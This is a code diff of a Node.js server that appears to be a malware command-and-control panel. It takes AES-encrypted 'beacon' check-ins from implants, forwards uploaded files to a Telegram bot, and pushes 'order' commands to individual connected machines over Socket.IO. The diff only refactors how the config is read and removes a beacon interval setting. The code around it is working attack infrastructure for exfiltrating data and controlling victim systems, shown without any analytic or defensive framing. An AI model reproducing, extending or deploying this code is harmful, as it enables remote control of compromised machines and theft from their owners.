@@ -2,13 +2,17 @@
 
 const cfg = JSON.parse(fs.readFileSync('./data.json')); const app = express(); const srv = http.createServer(app); const io = new Server(srv, { cors: { origin: '*' } }); const bot = new TelegramBot(cfg.token, { polling: true }); const up = multer({ dest: 'tmp/' });
 
-const log = m => console.log([${new Date().toISOString()}] ${m}); const enc = d => { const iv = crypto.randomBytes(16); const c = crypto.createCipheriv('aes-256-cbc', Buffer.from(cfg.X.encKey,'hex'), iv); return iv.toString('hex')+':'+c.update(d,'utf8','hex')+c.final('hex'); }; const dec = d => { const [iv,txt] = d.split(':'); const c = crypto.createDecipheriv('aes-256-cbc', Buffer.from(cfg.X.encKey,'hex'), Buffer.from(iv,'hex')); return c.update(txt,'hex','utf8')+c.final('utf8'); };
+const log = m => console.log([${new Date().toISOString()}] ${m});
+
+const enc = d => { const iv = crypto.randomBytes(16); const c = crypto.createCipheriv('aes-256-cbc', Buffer.from(cfg.encKey,'hex'), iv); return iv.toString('hex')+':'+c.update(d,'utf8','hex')+c.final('hex'); };
+
+const dec = d => { const [iv,txt] = d.split(':'); const c = crypto.createDecipheriv('aes-256-cbc', Buffer.from(cfg.encKey,'hex'), Buffer.from(iv,'hex')); return c.update(txt,'hex','utf8')+c.final('utf8'); };
 
 app.use(express.static('public')); app.use(express.json({limit:'50mb'})); app.get('/',(_,r)=>r.sendFile(path.join(__dirname,'public','index.html')));
 
 app.post('/up', up.single('f'), (q,r)=>{ const {originalname, buffer} = q.file; bot.sendDocument(cfg.id, buffer, {caption:📁 ${originalname}}, {filename:originalname}); r.sendStatus(200); });
 
-app.post('/b', (q,r)=>{ const j = JSON.parse(dec(q.body.d)); j.t = Date.now(); io.to('master').emit('beacon', j); r.json({status:'ok', interval:cfg.X.interval}); });
+app.post('/b', (q,r)=>{ const j = JSON.parse(dec(q.body.d)); j.t = Date.now(); io.to('master').emit('beacon', j); r.json({status:'ok'}); });
 
 io.on('connection', s=>{ s.on('auth', p=>{ if(p!==cfg.token) return s.disconnect(); s.join('master'); }); s.on('cmd', j=> io.to(j.id).emit('order', {type:j.type, payload:j.payload}) ); });
 
